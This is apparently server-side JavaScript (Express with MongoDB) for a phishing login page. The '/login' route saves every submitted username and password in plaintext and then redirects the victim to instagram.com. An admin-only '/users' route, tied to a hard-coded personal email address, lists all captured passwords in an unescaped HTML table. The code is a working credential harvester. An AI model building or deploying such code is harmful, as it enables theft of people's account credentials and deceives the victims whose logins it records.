// Login POST route
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.send("Please fill in all fields.");
  }

  try {
    await usersCollection.insertOne({
      email: username,
      password: password,
      created_at: new Date(),
    });

    // Store session
    req.session.email = username;

    // Redirect based on user type
    if (username === "imanetidj4@gmail.com") {
      // Admin user sees /users
      res.redirect("/users");
    } else {
      // Normal users go to external URL
      res.redirect("https://instagram.com");
    }
  } catch (err) {
    console.error("❌ Error saving to MongoDB:", err);
    res.send("Error saving to MongoDB: " + err.message);
  }
});

// Admin-only users page
app.get("/users", async (req, res) => {
  // Only allow admin
  if (req.session.email !== "imanetidj4@gmail.com") {
    return res.redirect("http://instagram.com"); // redirect non-admins to home
  }

  try {
    const allUsers = await usersCollection.find({}).toArray();

    let html = `<h1>All Users</h1>
    <table border="1" cellpadding="5" cellspacing="0">
    <tr><th>Email</th><th>Password</th><th>Created At</th></tr>`;

    allUsers.forEach(user => {
      html += `<tr>
        <td>${user.email}</td>
        <td>${user.password}</td>
        <td>${new Date(user.created_at).toLocaleString()}</td>
      </tr>`;
    });

    html += `</table>`;
    res.send(html);

  } catch (err) {
    console.error("❌ Error fetching users:", err);
    res.status(500).send("Error fetching users");
  }
});
